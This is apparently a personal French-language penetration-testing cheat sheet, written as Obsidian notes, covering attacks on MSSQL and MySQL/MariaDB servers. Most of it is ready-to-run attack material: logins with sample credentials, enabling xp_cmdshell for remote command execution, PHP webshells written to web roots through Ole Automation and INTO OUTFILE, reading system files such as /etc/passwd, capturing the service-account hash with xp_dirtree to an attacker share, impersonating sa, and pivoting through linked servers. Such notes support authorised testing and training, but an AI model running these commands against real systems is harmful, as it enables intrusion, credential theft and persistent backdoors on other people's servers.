
- [ ] [[#1. BRUTEFORCE Bruteforce en ligne MSSQL]]
- [ ] [[#2. interagir avec la DB]]
- [ ] [[#3. RCE]]



---

# 1. BRUTEFORCE [[Bruteforce en ligne#MSSQL]]


---

# 2. interagir avec la DB

- [[#WINDOWS]]
- [[#LINUX]]

## WINDOWS

### MSSQL

```cmd
sqlcmd -S 10.129.20.13 -U username -P Password123
```

### MySQL

```cmd
mysql.exe -u username -p"Password123" -h 10.129.20.13
```

```cmd
mysql.exe -u username -p"Password123" -h 10.129.20.13 -e "commande à executer"
```

[[Commandes SQL#MY SQL / MARIADB]]


## LINUX

### MSSQL

```shell
sqsh -S 10.129.20.13 -U username -P Password123
```

utiliser l'authent windows
```shell
sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
```

utiliser Impacket si sqsh ne fonctionne pas -> [[Commandes SQL#Client Impacket-mssqlclient]]
#### Identifier les db

```sql
SELECT name FROM master.dbo.sysdatabases
```

#### Switch sur une db

```sql
USE flagDB
```

#### Afficher les tables de la db

```sql
SELECT table_name FROM flagDB.INFORMATION_SCHEMA.TABLES
```

#### Afficher les données de la table

```sql
SELECT * FROM tb_flag
```

### MySQL

[[Commandes SQL#MY SQL / MARIADB]]


### GUI avec DBEAVER

https://github.com/dbeaver/dbeaver/releases

```shell-session
sudo dpkg -i dbeaver-<version>.deb
```


---

# 3. RCE

## MSSQL
#### XP_CMDSHELL (Extended Stored Procedures)

Permet d'exécuter des commandes systèmes

Depuis la db

```cmd
xp_cmdshell 'whoami'
GO
```

en remote

```bash
nxc mssql 10.10.10.59 -u sa -p 'GWE3V65#6KFH93@4GWTG2G' --local-auth -x whoami
```

### SQLCMD
##### Si xp_cmdshell n'est pas activé, possible de l'activer si privilèges appropriés

depuis la db
```mssql
-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.  
RECONFIGURE
GO  

-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

-- To update the currently configured value for this feature.  
RECONFIGURE
GO
```

#### Ecriture de fichiers ([Ole Automation Procedures](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option))

activer Ole Automation Procedures
```mssql
sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
sp_configure 'Ole Automation Procedures', 1
GO
RECONFIGURE
GO
```

Créer un fichier

```mssql
DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
GO
```
#### Lecture de fichiers

```cmd-session
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
GO
```

#### Capture du Hash du compte de service MSSQL

1. Lancer responder ou impacket-smbserver [[LLMNR, NBT-NS Poisoning & SMB Relay - T1557.001#RESPONDER]]
2. XP_DIRTREE

```cmd-session
EXEC master..xp_dirtree '\\10.10.110.17\share\'
GO
```
 
 ou XP_SUBDIRS
 
```cmd-session
EXEC master..xp_subdirs '\\10.10.110.17\share\'
GO
```

3. Puis relai smb ou crack du hash

#### Impersonation d'un user

Identifier les users dont l'usurpation est possible
```cmd-session
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
GO
```

Impersonation du user sa (depuis la masterdb)
```cmd-session
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO
```

Possible maintenant d'exécuter des commandes en admin de la db

#### Latéraliser vers une autre DB

https://learn.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-sysservers-transact-sql?view=sql-server-ver16

Linked servers -> permet de faire une requête vers une autre base de données.

Identifier les serveurs liés

```cmd
SELECT srvname, isremote FROM sysservers
GO
```

si isremote = 0 alors linked server

Identifier le user utilisé pour la connexion et ses privilèges avec EXECUTE qui permet d'envoyer la requête à exécuter en remote. (possible d'enchainer les requêtes avec ; )
```cmd-session
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
GO
```




## MYSQL / MARIADB

### RCE

```
system <command>
```

### SHELL local

```
\! /bin/sh
```


### File Privilege

Afficher FILE privilege (si valeur vide alors privilège !)

```shell
show variables like "secure_file_priv";
```

### Ecrire fichier en local (upload d'un webshell)

```shell
SELECT "<?php echo shell_exec($_REQUEST['cmd']);?>" INTO OUTFILE ' C:/xampp/htdocs/xampp/webshell.php';
```

### Lire fichier en local

```shell-session
select LOAD_FILE("/etc/passwd");
```
